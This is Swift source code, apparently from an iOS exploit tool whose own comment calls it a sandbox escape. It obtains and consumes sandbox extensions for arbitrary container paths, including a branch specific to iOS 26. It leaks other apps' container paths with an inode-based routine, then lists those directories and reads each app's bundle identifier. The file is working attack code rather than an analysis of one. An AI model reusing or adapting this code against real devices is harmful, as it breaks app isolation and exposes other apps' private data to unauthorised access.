import Foundation
import Darwin

/// The App Group this build is actually provisioned with.
/// It must match `worse_query.entitlements` — changing this string alone
/// (without creating and provisioning a new App Group in Xcode) breaks
/// the sandbox escape, so it stays as the original worse_query group.
let workGestaltAppGroup = "group.cc.forcequit.worse-query"

// MARK: - Sandbox Extension

func consumeExtension(_ path: String) -> Int64 {
    var handle: Int64 = -255

    if path.contains("/var/mobile/Containers/Shared/AppGroup") &&
        ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26 {
        handle = worse_query(path, workGestaltAppGroup, true, false)
    } else {
        handle = worse_query(path, workGestaltAppGroup, false, false)
    }

    switch handle {
    case -1: print("failed to access group!")
    case -2: print("failed to resolve functions!")
    case -3: print("failed to create query!")
    case -4: print("failed to create symlink!")
    case -5: print("query rejected!")
    case -6: print("kernel refused extension issue!")
    case -255: print("target doesn't exist!")
    default: print("handle: \(handle)")
    }

    return handle
}

func releaseExtension(_ handle: Int64) {
    guard handle > 0 else {
        print("sandbox extension hasn't been consumed!")
        return
    }
    worse_query_release(handle)
    print("released sandbox extension!")
}

// MARK: - Path Leak

func leakPaths(_ filter: String) {
    let files = FileManager.default
    let baselineURL = files.temporaryDirectory.appendingPathComponent(".baseline_\(UUID().uuidString)")
    var baselineInode: UInt64 = 0

    do {
        try "helloworld".write(to: baselineURL, atomically: true, encoding: .utf8)
        var baselineInfo = stat()
        if stat(baselineURL.path, &baselineInfo) == 0 {
            baselineInode = baselineInfo.st_ino
            print("baseline: \(baselineInode)")
        } else {
            print("Failed to get baseline inode!")
        }
        try files.removeItem(at: baselineURL)
    } catch {
        print("Failed to get baseline inode: \(error)")
        return
    }

    print("This is gonna take a while...")

    DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
        let paths = pathleak(filter, baselineInode) ?? []
        print(paths.count)

        for path in paths {
            let handle = consumeExtension(path)
            if handle > 0 {
                var buf = [CChar](repeating: 0, count: 512)
                let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
                if len > 0 {
                    let bundleID = String(cString: buf)
                    print("\n\(bundleID): \(path)\n")
                }
                releaseExtension(handle)
            }
        }
        print("Done!")
    }
}

func listPaths(_ path: String) {
    let handle = consumeExtension(path)
    guard handle > 0 else {
        print("Failed to get parent directory extension!")
        return
    }

    let files = FileManager.default
    let root = URL(filePath: path)
    var collected: [String] = []

    do {
        let enumerated = try files.contentsOfDirectory(
            at: root,
            includingPropertiesForKeys: [.isDirectoryKey],
            options: [.skipsHiddenFiles]
        )

        for fileURL in enumerated {
            let resourceValues = try fileURL.resourceValues(forKeys: [.isDirectoryKey])
            if resourceValues.isDirectory == true {
                collected.append(fileURL.path)
            }
        }
    } catch {
        print("Failed to load enumerate directories!")
    }

    for path in collected {
        print(path)
        var buf = [CChar](repeating: 0, count: 512)
        let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
        if len > 0 {
            let bundleID = String(cString: buf)
            print("\n\(bundleID): \(path)\n")
        }
    }

    releaseExtension(handle)
}
